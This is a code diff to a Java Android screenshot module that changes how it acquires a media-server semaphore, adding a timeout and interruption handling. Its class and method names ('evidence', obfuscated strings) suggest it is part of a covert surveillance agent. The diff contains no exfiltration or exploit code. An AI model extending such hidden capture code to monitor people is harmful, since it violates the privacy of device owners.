@@ -14,6 +14,7 @@ import java.io.File;
 import java.io.IOException;
 import java.nio.ByteBuffer;
 import java.util.concurrent.Semaphore;
+import java.util.concurrent.TimeUnit;
 
 import android.content.Context;
 import android.graphics.Bitmap;
@@ -135,41 +136,49 @@ public class ModuleSnapshot extends BaseInstantModule {
 			return;
 		}
 
-		if (Status.self().semaphoreMediaserver.tryAcquire()) {
+		try {
+			if (Status.self().semaphoreMediaserver.tryAcquire(2000, TimeUnit.MILLISECONDS)) {
+				try {
+					if (!screencapMethod()) {
+						screenCap = false;
+						if (!frameBufferMethod()) {
+							frameBuffer = false;
 
-			try {
-				if (!screencapMethod()) {
-					screenCap = false;
-					if (!frameBufferMethod()) {
-						frameBuffer = false;
-
+						}
 					}
-				}
 
-				if (!frameBuffer && !screenCap) {
-					if (!infoScreenSent) {
-						EvidenceBuilder.info(M.e("Screenshot not supported")); //$NON-NLS-1$
-						infoScreenSent = true;
+					if (!frameBuffer && !screenCap) {
+						if (!infoScreenSent) {
+							EvidenceBuilder.info(M.e("Screenshot not supported")); //$NON-NLS-1$
+							infoScreenSent = true;
+						}
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (actualStart) Screenshot not supported");
+						}
 					}
+
+				} catch (final Exception ex) {
+					if (Cfg.EXCEPTION) {
+						Check.log(ex);
+					}
+
 					if (Cfg.DEBUG) {
-						Check.log(TAG + " (actualStart) Screenshot not supported");
+						Check.log(TAG + " (go) Error: " + ex);//$NON-NLS-1$
+						Check.log(ex);//$NON-NLS-1$
 					}
+				} finally {
+					Status.self().semaphoreMediaserver.release();
 				}
-
-			} catch (final Exception ex) {
-				if (Cfg.EXCEPTION) {
-					Check.log(ex);
-				}
-
+			}else{
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (go) Error: " + ex);//$NON-NLS-1$
-					Check.log(ex);//$NON-NLS-1$
+					Check.log(TAG + " (actualStart) failed to get sem for screen snapshot");
 				}
-			} finally {
-				Status.self().semaphoreMediaserver.release();
+			}
+		} catch (Exception e) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (actualStart) failed to get sem for screen snapshot INTERRUPTED");
 			}
 		}
-
 	}
 
 	private boolean screencapMethod() {
